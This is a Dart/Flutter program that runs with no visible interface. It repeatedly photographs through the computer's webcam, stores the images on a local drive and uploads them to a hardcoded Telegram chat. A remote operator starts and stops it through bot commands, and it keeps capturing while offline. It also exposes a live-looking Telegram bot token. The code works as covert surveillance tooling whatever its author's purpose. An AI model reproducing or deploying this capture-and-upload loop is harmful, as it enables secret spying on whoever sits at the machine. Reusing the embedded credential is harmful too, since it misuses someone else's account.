// ignore_for_file: prefer_final_fields

import 'dart:async';
import "dart:io";
import 'package:camera_platform_interface/camera_platform_interface.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:televerse/televerse.dart';
import 'package:connectivity_plus/connectivity_plus.dart';

final String bot_token = "7541455648:AAHB4k27beqnIcC6L_AZng1tRN1mXie6PG4";
final ChatID chat_id = new ChatID(1056396152);

void main() async {
  // runApp(const MyApp());
  var bot = Bot(bot_token);

  WidgetsFlutterBinding.ensureInitialized();

  List<CameraDescription> _cameras = <CameraDescription>[];
  int _cameraIndex = 0;
  int _cameraId = -1;
  bool _initialized = false;
  bool pictureSended = false;
  bool connectedToNetwork = false;

  List<CameraDescription> cameras = <CameraDescription>[];

  int cameraIndex = 0;
  MediaSettings _mediaSettings = const MediaSettings(
    resolutionPreset: ResolutionPreset.max,
    fps: 15,
    videoBitrate: 200000,
    audioBitrate: 32000,
    enableAudio: true,
  );

  Future<void> takePicture2() async {
    try {
      await CameraPlatform.instance.dispose(_cameraId);
      serializeExposureMode(ExposureMode.locked);
      int cameraId = -1;
      final int cameraIndex = _cameraIndex % _cameras.length;
      final CameraDescription camera = _cameras[cameraIndex];
      cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);

      final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
      await CameraPlatform.instance.initializeCamera(cameraId);
      await initialized;

      _initialized = true;
      _cameraId = cameraId;
      _cameraIndex = cameraIndex;
      final XFile file = await CameraPlatform.instance.takePicture(_cameraId);

      String targetPath = "D:/test/";
      final originalFile = File(file.path);
      pictureSended = true;
      String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
      final newFileInTargetPath = await originalFile.copy(targetPath + file.name);
      await originalFile.delete();
      if (connectedToNetwork) {
        print("Connected to Network, Sending to Telegram");
        try {
          await bot.api.sendPhoto(chat_id, InputFile.fromFile(newFileInTargetPath));
        } catch (e) {
          print("Failed sending to telegram, Network Disconnected!");
        }
      }
      newFileInTargetPath.rename(targetPath + newName);

      await CameraPlatform.instance.dispose(_cameraId);

      _initialized = false;
      _cameraId = -1;
    } catch (e) {}
  }

  var timer = Timer(Duration(minutes: 1), () {});

  void startTimerOnDisconnected() {
    print("Starting Disconnected Timer");
    timer = Timer.periodic(new Duration(seconds: 10), (timer) async {
      try {
        cameras = await CameraPlatform.instance.availableCameras();
        if (!cameras.isEmpty) {
          cameraIndex = _cameraIndex % cameras.length;
        }
      } catch (e) {}

      _cameraIndex = cameraIndex;
      _cameras = cameras;

      takePicture2();
    });
  }

  void startTimer() {
    print("Starting Timer");
    timer = Timer.periodic(new Duration(seconds: 5), (timer) async {
      try {
        cameras = await CameraPlatform.instance.availableCameras();
        if (!cameras.isEmpty) {
          cameraIndex = _cameraIndex % cameras.length;
        }
      } catch (e) {}

      _cameraIndex = cameraIndex;
      _cameras = cameras;

      takePicture2();
    });
  }

  void stopTimer() {
    print("Stopping Timer");
    timer.cancel();
  }

  void startTimer2() {
    print("Starting Picture");
    pictureSended = false;
    timer = Timer.periodic(new Duration(seconds: 5), (timer) async {
      try {
        cameras = await CameraPlatform.instance.availableCameras();
        if (!cameras.isEmpty) {
          cameraIndex = _cameraIndex % cameras.length;
        }
      } catch (e) {}

      _cameraIndex = cameraIndex;
      _cameras = cameras;

      takePicture2();
      if (pictureSended) {
        stopTimer();
        pictureSended = false;
      }
    });
  }

  // startTimer();
  /// Setup the /start command handler
  ///
  try {
    StreamSubscription<List<ConnectivityResult>> subscription = Connectivity().onConnectivityChanged.listen((List<ConnectivityResult> result) async {
      // Received changes in available connectivity types!
      if (result.contains(ConnectivityResult.none))
        connectedToNetwork = false;
      else
        connectedToNetwork = true;

      if (connectedToNetwork) {
        print("Connected to network, Starting bot after 5s");
        Timer(Duration(seconds: 5), () async {
          stopTimer();
          print("Starting bot");
          try {
            await bot.stop();
            bot = Bot(bot_token);
            bot.command('start', (ctx) async => await ctx.reply("Hello!"));

            bot.command('picture', (ctx) async => startTimer2());
            bot.command('p', (ctx) async => startTimer2());

            bot.command('startPic', (ctx) async => startTimer());
            bot.command('startpic', (ctx) async => startTimer());
            bot.command('startTimer', (ctx) async => startTimer());
            bot.command('starttimer', (ctx) async => startTimer());
            bot.command('p', (ctx) async => startTimer());
            bot.command('tp', (ctx) async => startTimer());
            bot.command('pt', (ctx) async => startTimer());
            bot.command('ps', (ctx) async => startTimer());
            bot.command('sp', (ctx) async => startTimer());
            bot.command('t', (ctx) async => startTimer());
            bot.command('c', (ctx) async => startTimer());

            bot.command('stopPic', (ctx) async => stopTimer());
            bot.command('stoppic', (ctx) async => stopTimer());
            bot.command('stop', (ctx) async => stopTimer());
            bot.command('s', (ctx) async => stopTimer());
            await bot.api.sendMessage(chat_id, "Bot Connected to Network, Starting Bot");
            await bot.start();
            print("Bot Started");
          } catch (e) {
            print("Bot Failed to Start");
            var timeStartBot = Timer.periodic(Duration(seconds: 1), (timer) {});
            timeStartBot = Timer.periodic(Duration(seconds: 5), (timer) async {
              try {
                await bot.stop();
                bot = Bot(bot_token);
                bot.command('start', (ctx) async => await ctx.reply("Hello!"));

                bot.command('picture', (ctx) async => startTimer2());
                bot.command('p', (ctx) async => startTimer2());

                bot.command('startPic', (ctx) async => startTimer());
                bot.command('startpic', (ctx) async => startTimer());
                bot.command('startTimer', (ctx) async => startTimer());
                bot.command('starttimer', (ctx) async => startTimer());
                bot.command('p', (ctx) async => startTimer());
                bot.command('tp', (ctx) async => startTimer());
                bot.command('pt', (ctx) async => startTimer());
                bot.command('ps', (ctx) async => startTimer());
                bot.command('sp', (ctx) async => startTimer());
                bot.command('t', (ctx) async => startTimer());
                bot.command('c', (ctx) async => startTimer());

                bot.command('stopPic', (ctx) async => stopTimer());
                bot.command('stoppic', (ctx) async => stopTimer());
                bot.command('stop', (ctx) async => stopTimer());
                bot.command('s', (ctx) async => stopTimer());
                await bot.api.sendMessage(chat_id, "Bot Connected to Network, Starting Bot");
                await bot.start();
                print("Try Again to Starting Bot");
                timeStartBot.cancel();
              } catch (e) {
                print("Bot Failed to Start");
              }
            });
          }
        });
      }
      if (!connectedToNetwork) {
        print("Disconnected from network");
        await bot.stop();
        startTimerOnDisconnected();
      }
    });
  } catch (e) {}
}
